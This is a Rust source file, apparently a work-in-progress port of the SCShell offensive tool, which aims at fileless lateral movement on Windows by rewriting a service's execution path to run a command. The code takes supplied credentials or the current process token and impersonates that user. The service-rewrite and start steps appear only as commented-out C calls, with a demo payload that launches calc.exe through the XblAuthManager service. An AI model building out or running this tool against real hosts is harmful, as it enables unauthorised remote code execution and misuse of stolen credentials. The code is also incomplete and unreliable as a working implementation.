// SCSHell, Rust Variant
// Refs:
//  - https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/scshell_c_embed_bin.nim,
//  - https://github.com/Mr-Un1k0d3r/SCShell
// Fileless command execution/lateral movement on Windows hosts via rewriting the service execution path to execute cmd.exe, then changes it back
// OPSEC wise, it might not get better than this in some ways

use std::io;
use std::io::{stdin, stdout, Read, Write};
use windows::core::PCSTR;

use windows::Win32::{
    Foundation::{CloseHandle, BOOL, HANDLE},
    Security::{
        ImpersonateLoggedOnUser, LogonUserA, LOGON32_LOGON_NEW_CREDENTIALS,
        LOGON32_PROVIDER_DEFAULT, SC_HANDLE, TOKEN_ALL_ACCESS,
    },
    System::{
        Memory::GPTR,
        Services::{
            ChangeServiceConfigA, OpenSCManagerA, OpenServiceA, QueryServiceConfigA,
            QUERY_SERVICE_CONFIGA,
        },
        Threading::{GetCurrentProcess, OpenProcessToken},
    },
};

fn breakpoint() {
    let mut stdout = stdout();
    stdout.write(b"[*] Press Enter to continue...\n").unwrap();
    stdout.flush().unwrap();
    stdin().read(&mut [0]).unwrap();
}

// proc SCShell(targetHost: cstring, serviceName: cstring, payload: cstring, domain: cstring, username: cstring, password: cstring): int
fn SCShell(
    mut target_host: &str,
    service_name: &str,
    payload: &str,
    domain: &str,
    username: &str,
    password: &str,
) -> bool {
    let mut lpqsc: QUERY_SERVICE_CONFIGA;
    let mut lpqsize: u32;
    let mut originalBinaryPath: &str;
    let mut result: bool = false;

    println!("[*] Host: {}", &target_host);
    println!("[*] Service Name: {}", &service_name);
    println!("[*] Payload: {}", &payload);
    println!("[*] Domain: {}", &domain);
    println!("[*] Username: {}", &username);
    println!("[*] Password: {}", &password);

    unsafe {
        let target_host_ptr: PCSTR;

        // If the host is passed in, set the hostname variable to that name
        // Otherwise, the host can be Null and will be localhost implicitely

        if target_host == "local" {
            // target host is set to null
            println!("[+] Running on localhost");
            target_host_ptr = PCSTR(&0u8);
        } else {
            println!("[+] Targeting {}", target_host);
            target_host_ptr = PCSTR(target_host.as_ptr());
        }

        // If a username is provided with password,
        //  bResult = LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
        let mut hToken: HANDLE = HANDLE(0);
        if !username.is_empty() {
            println!("[+] Username: {}", username);
            let bResult: BOOL = LogonUserA(
                PCSTR(username.as_ptr()),
                PCSTR(domain.as_ptr()),
                PCSTR(password.as_ptr()),
                LOGON32_LOGON_NEW_CREDENTIALS,
                LOGON32_PROVIDER_DEFAULT,
                &mut hToken,
            );
        } else {
            println!("[*] No username provided, stealing current process token");
            OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &mut hToken);
        }
       
        println!("[*] Token handle: {:x?}", hToken);
        breakpoint();
        
        // bResult = ImpersonateLoggedOnUser(hToken);
        let bResult: BOOL = ImpersonateLoggedOnUser(hToken);
        // Using the (made) token to open the SCmanager

        // SC_HANDLE schManager = OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
        // SC_HANDLE schService = OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);

        // QueryServiceConfigA(schService, NULL, 0, &dwSize);

        //bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL);

        //  bResult = StartServiceA(schService, 0, NULL);

        // bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);

        // GlobalFree, close handle, close service handle, etc

        false
    }
}

fn main() {
    println!("[!] SCShell!");

    let res = SCShell(
        "local",
        "XblAuthManager",
        r"C:\WINDOWS\system32\cmd.exe /C calc.exe",
        "", // want to do it remotely? Change me!
        "",
        "",
    );

    println!("[*] Result: {}", res.to_string())
}
